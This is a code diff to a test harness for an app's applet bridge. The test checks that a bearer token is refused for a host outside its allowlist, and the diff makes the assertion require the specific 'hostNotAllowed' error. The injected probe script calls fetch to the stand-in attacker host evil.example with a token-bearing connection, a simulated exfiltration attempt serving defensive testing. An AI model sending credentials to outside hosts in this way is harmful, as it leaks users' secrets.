@@ -1678,7 +1678,9 @@ def connections_probe_html():
         "  await window.dreamux.http.fetch('https://evil.example/x', { connection: 'httpSlot' });\n"
         "  await window.dreamux.kv.set('httpGate', 'LEAKED');\n"
         "} catch (e) {\n"
-        "  await window.dreamux.kv.set('httpGate', 'blocked');\n"
+        "  const msg = String(e && e.message ? e.message : e);\n"
+        "  await window.dreamux.kv.set('httpGate',\n"
+        "    msg.includes('hostNotAllowed') ? 'blocked-by-allowlist' : 'blocked-other');\n"
         "}\n"
         '</script></body></html>\n'
     )
@@ -1706,11 +1708,22 @@ def scenario_connections(d):
          injected env var back into kv.json (`shellToken == "tok-123"`).
       2. HTTP host-allowlist NEGATIVE: a `bearer`-kind connection's token
          is refused for a host outside its own allowlist --
-         ConnectionAuthenticator rejects BEFORE `URLSession` is ever
-         called, so nothing is sent and no token leaves the process
-         (`httpGate == "blocked"`). No server needs to be listening for
-         this to be a meaningful assertion -- the whole point is that
-         nothing is dispatched.
+         ConnectionAuthenticator.authorize throws `hostNotAllowed` BEFORE
+         `URLSession` is ever called, so nothing is sent and no token
+         leaves the process. The assertion DISCRIMINATES on the rejection
+         error, not merely on "some error was caught": with the allowlist
+         wiring present, the throw is ALWAYS `hostNotAllowed` (a synchronous
+         pre-flight check), so its `String(describing:)` -- surfaced to JS
+         verbatim because ConnectionAuthError isn't LocalizedError, see
+         AppletBridge.reply(error:) -- contains the literal substring
+         `hostNotAllowed`, and the probe records `httpGate ==
+         "blocked-by-allowlist"`. If the wiring were removed, the fetch
+         would instead reach URLSession and fail on DNS (evil.example is a
+         reserved TLD that never resolves) -> a network error whose message
+         lacks `hostNotAllowed` -> `httpGate == "blocked-other"` (FAIL), or
+         succeed with a real 200 -> `LEAKED` (FAIL). So the test genuinely
+         proves the allowlist check exists, with NO network dependency --
+         no server need be listening either way.
       3. `connections.status(slot).bound` flips false -> true across
          `bindConnection`, proving the binding itself took effect.
 
@@ -1825,19 +1838,25 @@ def scenario_connections(d):
         except (OSError, json.JSONDecodeError):
             return None
         if (kv.get("shellToken") == "tok-123"
-                and kv.get("httpGate") == "blocked"
+                and kv.get("httpGate") == "blocked-by-allowlist"
                 and kv.get("statusBound") is True):
             return kv
         return None
 
     kv = d.wait_until(
         bridge_round_trip_complete, 15.0,
-        "kv.json to gain shellToken=tok-123 + httpGate=blocked + statusBound=true after "
-        "binding (shell env-injection and http allowlist-block through the real bridge)")
+        "kv.json to gain shellToken=tok-123 + httpGate=blocked-by-allowlist + statusBound=true "
+        "after binding (shell env-injection and http allowlist-block through the real bridge)")
     require(kv["shellToken"] == "tok-123",
             f"shell.exec should have received PROBE_TOKEN via the bound env connection: {kv}")
-    require(kv["httpGate"] == "blocked",
-            f"http.fetch to a non-allowlisted host must be rejected with nothing sent: {kv}")
+    # DISCRIMINATING assertion: the rejection must be the allowlist error
+    # (hostNotAllowed, thrown synchronously before URLSession), NOT any
+    # catch-all "some error happened". "blocked-other" here would mean the
+    # fetch reached the network and DNS-failed -- which is exactly what a
+    # DELETED allowlist check would produce, so it must FAIL, not pass.
+    require(kv["httpGate"] == "blocked-by-allowlist",
+            f"http.fetch to a non-allowlisted host must be rejected by the allowlist check "
+            f"(hostNotAllowed) BEFORE any network call, not by a downstream network/DNS error: {kv}")
     require(kv["statusBound"] is True,
             f"connections.status should read bound:true once bound: {kv}")
 
